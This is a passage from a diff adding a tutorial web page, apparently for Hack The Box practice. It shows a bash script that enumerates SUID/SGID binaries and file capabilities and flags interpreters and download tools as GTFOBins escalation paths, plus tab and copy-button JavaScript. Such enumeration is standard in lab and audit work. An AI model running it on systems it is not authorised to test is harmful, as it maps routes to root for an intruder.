+<div><span class="c">find / -perm /4000 -type f 2>/dev/null | sort | tee -a $REPORT</span></div>
+<div><span class="c"> </span></div>
+<div><span class="c">echo -e "\\n[*] All SGID binaries:" | tee -a $REPORT</span></div>
+<div><span class="c">find / -perm /2000 -type f 2>/dev/null | sort | tee -a $REPORT</span></div>
+<div><span class="c"> </span></div>
+<div><span class="c">echo -e "\\n[+] Safe/expected SUID:" | tee -a $REPORT</span></div>
+<div><span class="c">find / -perm /4000 -type f 2>/dev/null | grep -E "$SAFE" | tee -a $REPORT</span></div>
+<div><span class="c"> </span></div>
+<div><span class="c">echo -e "\\n[!!] DANGEROUS - check GTFOBins immediately:" | tee -a $REPORT</span></div>
+<div><span class="c">HITS=$(find / -perm /4000 -type f 2>/dev/null | grep -E "$DANGER")</span></div>
+<div><span class="c">if [ -n "$HITS" ]; then</span></div>
+<div><span class="c">  echo "$HITS" | tee -a $REPORT</span></div>
+<div><span class="c">  echo -e "\\n[!!] UNKNOWN - not in safe or danger list:" | tee -a $REPORT</span></div>
+<div><span class="c">  find / -perm /4000 -type f 2>/dev/null | grep -Ev "$SAFE|$DANGER" | tee -a $REPORT</span></div>
+<div><span class="c">else</span></div>
+<div><span class="c">  echo "None found." | tee -a $REPORT</span></div>
+<div><span class="c">fi</span></div>
+<div><span class="c"> </span></div>
+<div><span class="c">echo -e "\\n[*] Checking capabilities (also exploitable):"</span></div>
+<div><span class="c">getcap -r / 2>/dev/null | tee -a $REPORT</span></div>
+<div><span class="c"> </span></div>
+<div><span class="c">echo -e "\\n[+] Report saved: $REPORT"</span></div>
+<button class="cp-btn" onclick="cp(document.getElementById('script-raw').value,this)">Copy</button>
+</div>
+<textarea id="script-raw" style="display:none;">#!/bin/bash
+RED='\\033[0;31m' YEL='\\033[0;33m' GRN='\\033[0;32m' NC='\\033[0m'
+REPORT="suid_audit_$(hostname)_$(date +%Y%m%d_%H%M%S).txt"
+
+SAFE="passwd|sudo|su$|newgrp|gpasswd|chfn|chsh|mount|umount|ping|pkexec|ssh-keysign|dbus|polkit|Xorg|chrome-sandbox|pppd|mount.cifs|mount.nfs|ntfs-3g|fusermount|kismet"
+DANGER="find|python|perl|ruby|vim|nano|nmap|bash|\\bsh\\b|dash|awk|tee|cp|mv|less|more|curl|wget|tar|zip|env|cut|node|lua|php|gcc|make"
+
+echo "=== SUID/SGID Full Audit ===" | tee $REPORT
+echo "Host: $(hostname) | User: $(whoami) | Date: $(date)" | tee -a $REPORT
+echo "Current ID: $(id)" | tee -a $REPORT
+
+echo -e "\n[*] All SUID binaries:" | tee -a $REPORT
+find / -perm /4000 -type f 2>/dev/null | sort | tee -a $REPORT
+
+echo -e "\n[*] All SGID binaries:" | tee -a $REPORT
+find / -perm /2000 -type f 2>/dev/null | sort | tee -a $REPORT
+
+echo -e "\n[+] Safe/expected SUID:" | tee -a $REPORT
+find / -perm /4000 -type f 2>/dev/null | grep -E "$SAFE" | tee -a $REPORT
+
+echo -e "\n[!!] DANGEROUS - check GTFOBins immediately:" | tee -a $REPORT
+HITS=$(find / -perm /4000 -type f 2>/dev/null | grep -E "$DANGER")
+if [ -n "$HITS" ]; then
+  echo "$HITS" | tee -a $REPORT
+  echo -e "\n[!!] UNKNOWN - not in safe or danger list:" | tee -a $REPORT
+  find / -perm /4000 -type f 2>/dev/null | grep -Ev "$SAFE|$DANGER" | tee -a $REPORT
+else
+  echo "None found." | tee -a $REPORT
+fi
+
+echo -e "\n[*] Checking capabilities (also exploitable):"
+getcap -r / 2>/dev/null | tee -a $REPORT
+
+echo -e "\n[+] Report saved: $REPORT"</textarea>
+</div>
+<div class="terminal">
+<div><span class="cm"># Save, make executable, run</span></div>
+<div><span class="p">$</span><span class="c"> nano suid_full_audit.sh</span><span class="cm">  # paste the script</span></div>
+<div><span class="p">$</span><span class="c"> chmod +x suid_full_audit.sh</span></div>
+<div><span class="p">$</span><span class="c"> ./suid_full_audit.sh</span></div>
+<div><span class="p">$</span><span class="c"> cat suid_audit_*.txt</span><span class="cm">  # read the report</span></div>
+</div>
+<div class="success-box">This script is your first tool to run on every HTB box. It takes 10 seconds and immediately tells you if there is a SUID privesc path waiting.</div>
+`,
+
+];
+
+let cur = 0;
+
+function renderTabs(){
+  document.getElementById('tabs').innerHTML = tabs.map((t,i)=>`
+    <button class="tab ${i===cur?'active':''}" onclick="go(${i})">${t}</button>`).join('');
+}
+
+function cp(text, btn){
+  const el = document.getElementById('script-raw');
+  const val = el ? el.value : text;
+  navigator.clipboard.writeText(val).then(()=>{
+    btn.textContent='Copied';
+    setTimeout(()=>btn.textContent='Copy',1500);
+  }).catch(()=>{
+    btn.textContent='Copy';
+  });
+}
+
+function go(i){ cur=i; render(); }
+
+function render(){
+  document.getElementById('content').innerHTML = pages[cur]() + `
+  <div class="nav-bar">
+    ${cur>0?`<button onclick="go(${cur-1})">← Back</button>`:''}
+    ${cur<pages.length-1
+      ?`<button class="pri" onclick="go(${cur+1})">Next →</button>`
+      :`<button onclick="sendPrompt('Explain project 3: User and group audit — full details with step by step commands')">Next project ↗</button>`}
+  </div>`;
+  renderTabs();
+}
+
+render();
+</script>
